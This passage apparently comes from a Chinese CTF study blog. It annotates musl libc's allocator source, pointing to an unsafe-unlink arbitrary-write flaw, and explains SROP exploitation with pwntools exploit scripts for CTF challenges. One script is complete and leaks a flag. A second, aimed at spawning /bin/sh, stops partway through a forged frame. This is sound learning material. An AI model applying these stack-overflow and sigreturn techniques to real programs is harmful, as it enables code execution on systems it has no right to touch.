class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 当 malloc 时初步发现 ctx.active[sc] 没有 avail 的 chunk</span><br><span class="hljs-comment">// sc = size_to_class(n); req 是请求分配的大小</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alloc_slot</span><span class="hljs-params">(<span class="hljs-type">int</span> sc, <span class="hljs-type">size_t</span> req)</span><br>&#123;<br>    <span class="hljs-comment">// 详细检查一下缓存(可能有 freed mask 或者 meta.next 有可分配的)</span><br><span class="hljs-type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);<br><span class="hljs-keyword">if</span> (first) <span class="hljs-keyword">return</span> a_ctz_32(first);  <span class="hljs-comment">// 分配成功 return</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span> =</span> alloc_group(sc, req);  <span class="hljs-comment">// 进一步申请，全新的 meta 与 group</span><br><span class="hljs-keyword">if</span> (!g) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>g-&gt;avail_mask--;<br><span class="hljs-built_in">queue</span>(&amp;ctx.active[sc], g);  <span class="hljs-comment">// 加入缓存 &quot;bins&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="try-avail"><a class="header-anchor" href="#try-avail">¶</a>try_avail</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// try_avail(&amp;ctx.active[sc])</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title function_">try_avail</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **pm)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">m</span> =</span> *pm;<br><span class="hljs-type">uint32_t</span> first;<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">uint32_t</span> mask = m-&gt;avail_mask;<br><span class="hljs-keyword">if</span> (!mask) &#123;    <span class="hljs-comment">// 没有 avail</span><br><span class="hljs-keyword">if</span> (!m-&gt;freed_mask) &#123;   <span class="hljs-comment">// 没有 free 的 chunk ， meta 的 group 中所有的 chunk 都分配出去了</span><br>dequeue(pm, m);     <span class="hljs-comment">// meta UNLINK , UNSAFE UNLINK!!! 任意写漏洞</span><br>m = *pm;<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m = m-&gt;next;    <span class="hljs-comment">// 找下一个，如果没有下一个指向自己（循环链表）</span><br>*pm = m;<br>&#125;<br><br>mask = m-&gt;freed_mask;<br><br><span class="hljs-comment">// skip fully-free group unless it&#x27;s the only one</span><br><span class="hljs-comment">// or it&#x27;s a permanently non-freeable group</span><br><span class="hljs-keyword">if</span> (mask == (<span class="hljs-number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="hljs-number">-1</span> &amp;&amp; m-&gt;freeable) &#123;<br>m = m-&gt;next;<br>*pm = m;<br>mask = m-&gt;freed_mask;<br>&#125;<br><br><span class="hljs-comment">// activate more slots in a not-fully-active group</span><br><span class="hljs-comment">// if needed, but only as a last resort. prefer using</span><br><span class="hljs-comment">// any other group with free slots. this avoids</span><br><span class="hljs-comment">// touching &amp; dirtying as-yet-unused pages.</span><br><span class="hljs-keyword">if</span> (!(mask &amp; ((<span class="hljs-number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="hljs-number">-1</span>))) &#123;<br><span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>m = m-&gt;next;<br>*pm = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;<br><span class="hljs-type">int</span> span = UNIT + size*cnt;<br><span class="hljs-comment">// activate up to next 4k boundary</span><br><span class="hljs-keyword">while</span> ((span^(span+size<span class="hljs-number">-1</span>)) &lt; <span class="hljs-number">4096</span>) &#123;<br>cnt++;<br>span += size;<br>&#125;<br><span class="hljs-keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="hljs-number">1</span>)<br>cnt = m-&gt;last_idx+<span class="hljs-number">1</span>;<br>m-&gt;mem-&gt;active_idx = cnt<span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br>mask = activate_group(m);<br>assert(mask);<br>decay_bounces(m-&gt;sizeclass);<br>&#125;<br>    <span class="hljs-comment">// 提取出 avail 的第一个 chunk 对应的 mask ，return</span><br>first = mask&amp;-mask;<br>m-&gt;avail_mask = mask-first;<br><span class="hljs-keyword">return</span> first;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-slot-v2"><a class="header-anchor" href="#alloc-slot-v2">¶</a>alloc_slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alloc_slot</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">size_t</span>)</span>;<br><br><span class="hljs-comment">// struct meta *g = alloc_group(sc, req);  // 进一步申请，全新的 meta 与 group</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> meta *<span class="hljs-title function_">alloc_group</span><span class="hljs-params">(<span class="hljs-type">int</span> sc, <span class="hljs-type">size_t</span> req)</span><br>&#123;<br><span class="hljs-type">size_t</span> size = UNIT*size_classes[sc];<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, cnt;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *p;<br><br>    <span class="hljs-comment">// 分配全新的 meta</span><br>    <span class="hljs-comment">// 优先查看 ctx.free_meta_head 链表，如果没有</span><br>    <span class="hljs-comment">// 再查看  ctx 管理的 main_are 是否有剩的 meta，是否有其他的 meta_area ，如果都没有</span><br>    <span class="hljs-comment">// 尝试用 brk() 以内存页为标准分配堆，会中间多分配一个无读写权限的内存页，作为 guard</span><br>    <span class="hljs-comment">// brk() 失败会尝试用 mmap()</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">m</span> =</span> alloc_meta();<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> usage = ctx.usage_by_class[sc];<br><span class="hljs-comment">// 给 cnt 赋值，mmap，跳过</span><br><span class="hljs-comment">/**************************************************************************/</span><br><span class="hljs-type">size_t</span> pagesize = PGSZ;<br><span class="hljs-type">int</span> active_idx;<br><span class="hljs-keyword">if</span> (sc &lt; <span class="hljs-number">9</span>) &#123;<br><span class="hljs-keyword">while</span> (i&lt;<span class="hljs-number">2</span> &amp;&amp; <span class="hljs-number">4</span>*small_cnt_tab[sc][i] &gt; usage)<br>i++;<br>cnt = small_cnt_tab[sc][i];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// lookup max number of slots fitting in power-of-two size</span><br><span class="hljs-comment">// from a table, along with number of factors of two we</span><br><span class="hljs-comment">// can divide out without a remainder or reaching 1.</span><br>cnt = med_cnt_tab[sc&amp;<span class="hljs-number">3</span>];<br><br><span class="hljs-comment">// reduce cnt to avoid excessive eagar allocation.</span><br><span class="hljs-keyword">while</span> (!(cnt&amp;<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-number">4</span>*cnt &gt; usage)<br>cnt &gt;&gt;= <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// data structures don&#x27;t support groups whose slot offsets</span><br><span class="hljs-comment">// in units don&#x27;t fit in 16 bits.</span><br><span class="hljs-keyword">while</span> (size*cnt &gt;= <span class="hljs-number">65536</span>*UNIT)<br>cnt &gt;&gt;= <span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-comment">// 需求比较大的时候调用 mmap 分配</span><br><span class="hljs-comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span><br><span class="hljs-comment">// mmap, increase to 2. Then it might be; if not it will nest.</span><br><span class="hljs-keyword">if</span> (cnt==<span class="hljs-number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="hljs-number">2</span>) cnt = <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span><br><span class="hljs-comment">// larger than half the page size should be allocated as whole pages.</span><br><span class="hljs-keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="hljs-number">2</span>) &#123;<br><span class="hljs-comment">// check/update bounce counter to start/increase retention</span><br><span class="hljs-comment">// of freed maps, and inhibit use of low-count, odd-size</span><br><span class="hljs-comment">// small mappings and single-slot groups if activated.</span><br><span class="hljs-type">int</span> nosmall = is_bouncing(sc);<br>account_bounce(sc);<br>step_seq();<br><br><span class="hljs-comment">// since the following count reduction opportunities have</span><br><span class="hljs-comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span><br><span class="hljs-comment">// coarse usage as part of usage.</span><br><span class="hljs-keyword">if</span> (!(sc&amp;<span class="hljs-number">1</span>) &amp;&amp; sc&lt;<span class="hljs-number">32</span>) usage += ctx.usage_by_class[sc+<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">// try to drop to a lower count if the one found above</span><br><span class="hljs-comment">// increases usage by more than 25%. these reduced counts</span><br><span class="hljs-comment">// roughly fill an integral number of pages, just not a</span><br><span class="hljs-comment">// power of two, limiting amount of unusable space.</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">1</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">8</span>*pagesize) cnt = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">2</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">4</span>*pagesize) cnt = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">0</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">8</span>*pagesize) cnt = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">0</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">2</span>*pagesize) cnt = <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-type">size_t</span> needed = size*cnt + UNIT;<br>needed += -needed &amp; (pagesize<span class="hljs-number">-1</span>);<br><br><span class="hljs-comment">// produce an individually-mmapped allocation if usage is low,</span><br><span class="hljs-comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span><br><span class="hljs-comment">// or it avoids eagar slot allocation without wasting too much.</span><br><span class="hljs-keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="hljs-number">7</span>) &#123;<br>req += IB + UNIT;<br>req += -req &amp; (pagesize<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="hljs-number">4</span>*pagesize &amp;&amp; <span class="hljs-number">2</span>*cnt&gt;usage)) &#123;<br>cnt = <span class="hljs-number">1</span>;<br>needed = req;<br>&#125;<br>&#125;<br><br>p = mmap(<span class="hljs-number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (p==MAP_FAILED) &#123;<br>free_meta(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>m-&gt;maplen = needed&gt;&gt;<span class="hljs-number">12</span>;<br>ctx.mmap_counter++;<br>active_idx = (<span class="hljs-number">4096</span>-UNIT)/size<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (active_idx &gt; cnt<span class="hljs-number">-1</span>) active_idx = cnt<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (active_idx &lt; <span class="hljs-number">0</span>) active_idx = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/**************************************************************************/</span><br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> j = size_to_class(UNIT+cnt*size-IB);<br>        <span class="hljs-comment">// 又一次 alloc_slot 这是一个递归过程</span><br>        <span class="hljs-comment">// 尝试向更大的缓存要内存，更大缓存中的 chunk 会成为这里的 group</span><br><span class="hljs-type">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);<br><span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span>) &#123;<br>free_meta(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span> =</span> ctx.active[j];<br>p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);<br>        <span class="hljs-comment">// 以上代码走了类似 malloc 的过程 ， 向更大缓存要了块 chunk</span><br>m-&gt;maplen = <span class="hljs-number">0</span>;<br>p[<span class="hljs-number">-3</span>] = (p[<span class="hljs-number">-3</span>]&amp;<span class="hljs-number">31</span>) | (<span class="hljs-number">6</span>&lt;&lt;<span class="hljs-number">5</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;=cnt; i++)<br>p[UNIT+i*size<span class="hljs-number">-4</span>] = <span class="hljs-number">0</span>;<br>active_idx = cnt<span class="hljs-number">-1</span>;<br>&#125;<br>    <span class="hljs-comment">// 加入缓存的计数</span><br>ctx.usage_by_class[sc] += cnt;<br>    <span class="hljs-comment">// 设置新 meta 的初始值</span><br>m-&gt;avail_mask = (<span class="hljs-number">2u</span>&lt;&lt;active_idx)<span class="hljs-number">-1</span>;<br>m-&gt;freed_mask = (<span class="hljs-number">2u</span>&lt;&lt;(cnt<span class="hljs-number">-1</span>))<span class="hljs-number">-1</span> - m-&gt;avail_mask;<br>m-&gt;mem = (<span class="hljs-type">void</span> *)p;<br>m-&gt;mem-&gt;meta = m;<br>m-&gt;mem-&gt;active_idx = active_idx;<br>m-&gt;last_idx = cnt<span class="hljs-number">-1</span>;<br>m-&gt;freeable = <span class="hljs-number">1</span>;<br>m-&gt;sizeclass = sc;<br><span class="hljs-keyword">return</span> m;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">$<span class="hljs-number">10</span> = &#123;                                                                                                           <br>prev = <span class="hljs-number">0x55a680b781d0</span>,                                                                                          <br>next = <span class="hljs-number">0x55a680b781d0</span>,                                                                                          <br>mem = <span class="hljs-number">0x7f3478f92c50</span>,                                                                                           <br>avail_mask = <span class="hljs-number">0</span>,                                                                                                 <br>freed_mask = <span class="hljs-number">252</span>,                                                                                               <br>last_idx = <span class="hljs-number">9</span>,                                                                                                   <br>freeable = <span class="hljs-number">1</span>,                                                                                                   <br>sizeclass = <span class="hljs-number">2</span>,                                                                                                  <br>maplen = <span class="hljs-number">0</span>                                                                                 <br></code></pre></td></tr></table></figure><h1>Exploit</h1><p>主要是 dequeque 和 FSOP 的利用，先欠着(好吧其实是太菜了不会以后学)</p><h1>参考资料</h1><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！- easylyou</a></p><p><a href="https://www.cjovi.icu/WP/1549.html">RCTF2021-musl-WP - chuj</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/posts/341e3484.html"/>
    <url>/posts/341e3484.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>感觉到难大概是因为还没学会罢，愿在掌握之后再回头看能看到不一样的风景。</p></blockquote><h1>SROP(Sigreturn Oriented Programming)</h1><h2 id="理解"><a class="header-anchor" href="#理解">¶</a>理解</h2><p>网上很多大佬原理写的很好了，我这里就写点自己想法。</p><p>首先了解一下，signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png" alt=""></p><p>你不懂没关系（<s>我也不懂</s>），简单来说你发送 signal 的时候，会先把你的寄存器和 signal 信息存到你的用户栈里，然后跳到内核态去处理 signal，内核返回用户态执行信号处理之前，会设置信号处理函数的返回地址(x30)指向[vdso]中的 <strong>__kernel_rt_sigreturn</strong> 函数，来从栈中恢复取出之前所存的信息（<strong>无检验</strong>）。</p><p>那么我们试想一下，如果存在一个栈溢出漏洞。我们自己写一系列精心构造的数据，伪装成我们的寄存器和 signal 信息，然后先把返回地址覆盖成 <strong>Sigreturn</strong> ，后面紧跟着我们自己构造好的寄存器和 signal 信息，相当于我们恶意利用了这个恢复机制，于是我们可以控制 rip rsp 在内的所有寄存器，那么自然就可以控制程序执行了。</p><p>进一步，如果知道 <code>/bin/sh</code> 的地址，存在 syscall ，那么我们直接如下构造就可以 getshell 。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png" alt=""></p><p>但一般程序是不会直接给你 <code>/bin/sh</code> 的，你需要自己通过 read 往某个地址写。这就需要构造 SROP 链（关键gadget：<code>syscall;ret</code>），具体的我们下面看几个题。</p><hr><h2 id="利用前提"><a class="header-anchor" href="#利用前提">¶</a>利用前提</h2><p>大概是：</p><ol><li>syscall，signal 没 syscall 👦 玩毛 。</li><li>足够大的溢出空间，要能放得下伪造的 Frame。</li><li>好用的 gadget （非必要,详见 <code>smallest</code>），比如 pop rax 之类的，就算没有 <strong>Sigreturn</strong> ，x64 下把 rax 调到 15 后执行 syscall 是一样的效果。</li></ol><p>一般思路是想办法搞到 <code>/bin/sh</code> 的位置（没有就写一个）后利用 SROP 执行 execve ，其他的我不好说，直接看题吧。</p><hr><h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2><p>额，大概是从易到难吧。后面要是追加就不算了。</p><h3 id="FUNSIGNALS（白给的-Sigreturn）"><a class="header-anchor" href="#FUNSIGNALS（白给的-Sigreturn）">¶</a>FUNSIGNALS（白给的 Sigreturn）</h3><h4 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h4><p>丢到 IDA 里面去，单纯的 SROP 题目都是比较简洁的。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png" alt="image-20220329111928988"></p><p>首先要看懂这个程序：</p><ol><li><code>mov dh, 4</code> 的意思在这里是 <code>RDX = 0x400</code>，不清楚的话可以去 gdb 下断点后按 r 再跑一遍自己验证。`</li><li>开头到第一个 syscall 意思就是在 rsp 的地方读入 0x400 的数据。</li><li>题目贴心的是，后面的 <code>push 0xF pop rax syscall</code>，相当于直接调用了 <strong>Sigreturn</strong> 了（RAX = 15）。后面的 <code>int 3</code> 你不用管它，我们 Sigreturn 的是自己构造的 Frame ，把 rsp 和 rip 🐑 了就没它的事了。</li></ol><p>我们要干的事也很简单，简单的构造一个恶意 Frame ，用 write 去泄露这个 flag 。直接调用 pwntools 构造。</p><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br><br>p = process(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;hack.bckdr.in&#x27;,17002)</span><br>elf = ELF(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>frame=SigreturnFrame()<br>frame.rax = constants.SYS_write <span class="hljs-comment"># 1 is ok</span><br>frame.rdi = constants.STDOUT_FILENO <span class="hljs-comment"># 1 is ok</span><br>frame.rsi = elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]<br>frame.rdx = <span class="hljs-number">100</span><br>frame.rip = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br><br>p.sendline(<span class="hljs-built_in">str</span>(frame))<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="rootersctf-2019-srop（pop-rax-构造的-Sigreturn）"><a class="header-anchor" href="#rootersctf-2019-srop（pop-rax-构造的-Sigreturn）">¶</a>rootersctf_2019_srop（pop rax 构造的 Sigreturn）</h3><h4 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h4><p>程序逻辑也很简单：先输出 data 段 buf 内的信息，往 <code>rsp-0x40</code> 处写入 <code>0x400</code> 的数据。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png" alt="image-20220329141956305"></p><p>这题没有白给的 Sigreturn ，但是有个很好用的 gadget <code>pop rax syscall</code> 。</p><p>基本思路是：第一次伪造 Frame 在已知地址处写入 <code>/bin/sh</code> ，第二次伪造 Frame 进行一个 <code>/bin/sh</code> 的 <code>execve</code> 。</p><p>首先， 栈溢出覆盖 rip 为 <code>pop rax;syscall;leave;retn</code> 这个 gadget，后面紧跟 Sigreturn 调用号 15 和 第一个伪造的 Frame。</p><p>有必要说明一下 Frame 具体的构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><span class="hljs-comment"># read 调用号</span><br>fuck.rdi = <span class="hljs-number">0</span><span class="hljs-comment"># fd</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><span class="hljs-comment"># buf</span><br>fuck.rdx = <span class="hljs-number">0x400</span><span class="hljs-comment"># count 不要写小了，没你好果汁吃(ᗜ_ᗜ）</span><br>fuck.rip = syscall_ret<span class="hljs-comment"># syscall;leave;retn</span><br>fuck.rsp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss 段已知地址</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss 